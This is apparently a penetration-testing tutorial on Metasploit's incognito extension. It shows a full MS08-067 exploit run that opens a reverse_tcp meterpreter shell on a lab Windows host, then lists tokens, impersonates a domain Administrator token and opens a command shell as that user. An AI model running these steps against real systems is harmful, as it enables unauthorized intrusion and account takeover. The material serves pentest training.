---
draft: false
title: MSF Incognito
linkTitle: MSF Incognito
translationKey: msf-incognito
weight: 280
date: 2017-06-05T13:24:00+03:00
author: İbrahim Korucuoğlu ([@siberoloji](https://github.com/siberoloji))
description: Gaining access to a system, you can use the token and permissions called incognito. This article explains how to use the incognito module in Metasploit Framework.
url: /msf-incognito/
featured_image: /images/metasploit.jpg
categories:
    - Metasploit Framework
tags:
    - cybersecurity
    - metasploit framework
---
## What is Incognito?

When you log in to a system, there are permission and authorization rules called **token** for the users in the system. These rules are similar to cookie files used in web applications. When the user first connects to a service on the network (e.g. Net drive), they log in with their username and password. When they log in, the system defines a **token** for this user. Now, they will be able to use the service in the system without having to enter their password over and over again until the computer is shut down.

During pentest operations, seizing and using this **token** and its authorizations is called the **incognito** operation. **token** permissions are divided into two. These are called **delegate** and **impersonate**. We will continue to use their English forms so that the reader does not get confused.

Delegate: token permissions are used as declaratives. They are used in interactive sessions, for example, for operations such as remote desktop connections.

Impersonate: token permissions are personally generated permissions and are used for non-interactive services. For example, connecting to a network folder.

File servers are a very rich source of information for these token permissions.

When you capture a token on the target system, you no longer need to know the password of that user to connect to a service because authorization has already been done and authorization control is done in the background by relying on the **token** permission. When the meterpreter shell is opened on a system, the available **token** list should be checked.

## Let's Login to Meterpreter

In the example below, first the necessary settings are made using the `ms08_067_netapi` module and a session is opened.

```bash
msf > use exploit/windows/smb/ms08_067_netapi
msf exploit(ms08_067_netapi) > set RHOST 10.211.55.140
RHOST => 10.211.55.140
msf exploit(ms08_067_netapi) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf exploit(ms08_067_netapi) > set LHOST 10.211.55.162
LHOST => 10.211.55.162
msf exploit(ms08_067_netapi) > set LANG english
LANG => english
msf exploit(ms08_067_netapi) > show targets

Exploit targets:

 Id Name
 -- ----
 0 Automatic Targeting
 1 Windows 2000 Universal
 2 Windows XP SP0/SP1 Universal
 3 Windows XP SP2 English (NX)
 4 Windows XP SP3 English (NX)
 5 Windows 2003 SP0 Universal
 6 Windows 2003 SP1 English (NO NX)
 7 Windows 2003 SP1 English (NX)
 8 Windows 2003 SP2 English (NO NX)
 9 Windows 2003 SP2 English (NX)
 10 Windows XP SP2 Arabic (NX)
 11 Windows XP SP2 Chinese - Traditional / Taiwan (NX)
msf exploit(ms08_067_netapi) > set TARGET 8
target => 8
msf exploit(ms08_067_netapi) > exploit

> Handler binding to LHOST 0.0.0.0
> Started reverse handler
> Triggering the vulnerability...
> Transmitting intermediate stager for **over-sized stage...(191 bytes)
> Sending stage (2650 bytes)
> Sleeping before handling stage...
> Uploading DLL (75787 bytes)...
> Upload completed.
> Meterpreter session 1 opened (10.211.55.162:4444 -> 10.211.55.140:1028)

meterpreter >
```

## Let's Install the Incognito Module

After we have successfully opened a meterpreter session, we need to use the `incognito` module. Since the `incognito` module belongs to meterpreter, we activate the module with the `use incognito` command. Then, when you give the `help` command, we can see the commands specific to the `incognito` module.

```bash
meterpreter > use incognito
Loading extension incognito...success.
meterpreter > help

Incognito Commands
**=====**

 Command Description
 ------- -----------
 add_group_user Attempt to add a user to a global group with all tokens
 add_localgroup_user Attempt to add a user to a local group with all tokens
 add_user Attempt to add a user with all tokens
 impersonate_token Impersonate specified token
 list_tokens List tokens available under current user context
 snarf_hashes Snarf challenge/response hashes for **every token

meterpreter >
```

## Token List in the System

After loading the `incognito` module in Meterpreter, let's check the list with the `list_tokens` command. Some of the **token** permissions in the list may not even be accessible to Administrator users. The type we will be most interested in is the **SYSTEM** token permissions.

```bash
meterpreter > list_tokens -u

Delegation Tokens Available
**=============================**
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY ETWORK SERVICE
NT AUTHORITY\SYSTEM
SNEAKS.IN\Administrator

Impersonation Tokens Available
**=============================**
NT AUTHORITY\ANONYMOUS LOGON

meterpreter >
```

If you noticed the token named `SNEAKS.IN\Administrator` in the list above, it is in the **Delegation** list. You need to personalize it by changing it to **Impersonation**. For this, we will use the `impersonate_token` command. Be careful to use two `\\` signs when entering the command. Even though `\` is only one in the list, two must be entered when entering the command.

```bash
meterpreter > impersonate_token SNEAKS.IN\\Administrator
[+] Delegation token available
[+] Successfully impersonated user SNEAKS.IN\Administrator
meterpreter > getuid
Server username: SNEAKS.IN\Administrator
meterpreter >
```

When the command was successfully completed, when we checked the user ID with the `getuid` command, we got the result `Server username: SNEAKS.IN\Administrator`.

## Opening a Shell with a New User

Let's log in to the command line with the `execute -f cmd.exe -i -t` command in Meterpreter and look at the Windows user ID with the `whoami` command. Here, the `-i` option means **interact***, and the `-t` option means using the newly acquired `SNEAKS.IN\Administrator` token permission.

```bash
meterpreter > shell
Process 2804 created.
Channel 1 created.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32> whoami
whoami
SNEAKS.IN\administrator

C:\WINDOWS\system32>
```

You may encounter **token** permissions on personal computers more often on server computers. The list will be longer since many services on the servers are interactive and multi-user. Among these, you should try the most authorized **token** permissions.
